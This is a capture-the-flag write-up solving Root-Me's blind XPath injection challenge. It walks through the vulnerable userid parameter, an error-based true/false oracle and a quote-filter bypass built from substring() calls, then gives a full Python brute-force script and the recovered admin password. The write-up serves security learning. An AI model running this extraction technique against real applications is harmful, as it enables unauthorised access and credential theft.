#XPath injection - Blind

Based on the Challenge Name, you can see that we will use Blind XPath Injection to solve this problem. You can read more about Blind XPath Injection [here](https://owasp.org/www-community/attacks/Blind_XPath_Injection)

Firstly, the injection point is at the Members section.

![anh1](https://live.staticflickr.com/65535/51834116972_b840cea7e2_z.jpg)

when you access this section and click on any member in the table, the url will look like this: *http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2*

The injection point is the `userid` parameter. You can check by enter `or` operator (|), an error will occur. We can use this to check if our conditional expression is true or not and achive our goal. If our exploit code is true, the page will not display any error. If not, we will see the error sceen. We will use this to blind Xpath Injection.

![anh2](https://live.staticflickr.com/65535/51835798225_fe1581a2c1_b.jpg)

And now we know where should we exploit. I will use it to check for John's password length because he is administrator. 

After check his password length with my exploit code (I will show it at the end of this writeup), i see that John's password length is 14. But after brute-force John's password, its length is actually 13 and I don't know why @@

![anh3](https://live.staticflickr.com/65535/51835061596_f68fa3113c_b.jpg)

And now we know that the password length is 13, we can bruteforce the password. But when you use the substring function with single quote or double quote, you will see that they are filter.

![anh4](https://live.staticflickr.com/65535/51835179303_59abc5e856_b.jpg)

Seeing that the single quote and double quotes is filter. Now I'm stuck @@ But after searching about it on Google, I see a way to bypass this filter. You can use substring function and extract many character from the table in Members section, although it's not enough character compare with the alphabet, but it's useful for this challenge.

![anh5](https://live.staticflickr.com/65535/51835179713_684d757151_z.jpg)

This is my code to exploit this challenge:

```python

import requests
import string
import os

pw_len = 0
pw = ""
url = "http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2 and "
for i in range (1,100):
	print("i=" + str(i))
	final_url = url + "string-length(//user[userid=2]/password)=" + str(i)
	res = requests.get(url=final_url)
	if "John's profile" in res.text:
		os.system("clear")
		pw_len = i
		print("Password length is: " + str(i))
		break
	elif i==100:
		print("An error occur!")
#pw length is actually 13, not 14 and I dont know how @@
candidate = {"a": "substring(//user[userid=2]/account,1,1)",
        "b": "substring(//user[userid=1]/account,3,1)",
        "c": "substring(//user[userid=1]/account,5,1)",
        "d": "substring(//user[userid=2]/account,2,1)",
        "e": "substring(//user[userid=1]/account,9,1)",
        "g": "substring(//user[userid=2]/email,12,1)",
        "h": "substring(//user[userid=2]/email,3,1)",
        "i": "substring(//user[userid=3]/username,3,1)",
        "l": "substring(//user[userid=5]/username,2,1)",
        "m": "substring(//user[userid=2]/account,3,1)",
        "n": "substring(//user[userid=2]/username,4,1)",
        "o": "substring(//user[userid=2]/username,2,1)",
        "r": "substring(//user[userid=3]/username,2,1)",
        "s": "substring(//user[userid=1]/email,1,1)",
        "t": "substring(//user[userid=1]/email,2,1)",
        "u": "substring(//user[userid=3]/account,2,1)",
        "v": "substring(//user[userid=1]/username,4,1)",
        "y": "substring(//user[userid=4]/username,5,1)",
        "S": "substring(//user[userid=1]/username,1,1)",
        "J": "substring(//user[userid=2]/username,1,1)",
        "E": "substring(//user[userid=3]/username,1,1)",
        "@": "substring(//user[userid=3]/email,4,1)",
        ".": "substring(//user[userid=3]/email,8,1)",
	"0":"string(0)",
	"1":"string(1)",
	"2":"string(2)",
	"3":"string(3)",
	"4":"string(4)",
	"5":"string(5)",
	"6":"string(6)",
	"7":"string(7)",
	"8":"string(8)",
	"9":"string(9)"
}
for j in range(1,14):
	print("j=" + str(j))
	for key in candidate:
		print("Current key: " + key)
		final_url2 = url + "substring(//user[userid=2]/password," + str(j) + ",1)=" + candidate[key]
		res = requests.get(url = final_url2)
		if "John's profile" in res.text:
			pw += key
			os.system("clear")
			print("Current string: " + pw)
			break
os.system("clear")
print("Password of admin is: " + pw)
#password is ueiJ4a65@1.oS

```

![anh6](https://live.staticflickr.com/65535/51835417724_bc56e60ceb_z.jpg)

Thank for [this page](https://ngaa.tistory.com/18?fbclid=IwAR39JEuheQ2dfykxE61GqKVjX0HN2Uf6DP0KmApusQZE6orURoNcfJPfRoc) and this [Github author](https://github.com/NhatNam-Kyoto/Rootme-Solution/blob/master/Xpath-blind.py?fbclid=IwAR1GcvyiiGSaJJNiU5NKJR7jz4sIZGdnsGyBgqBJ10EHInNq4QlYEUEvdwI), I am able to bruteforce the password and solve this problem.
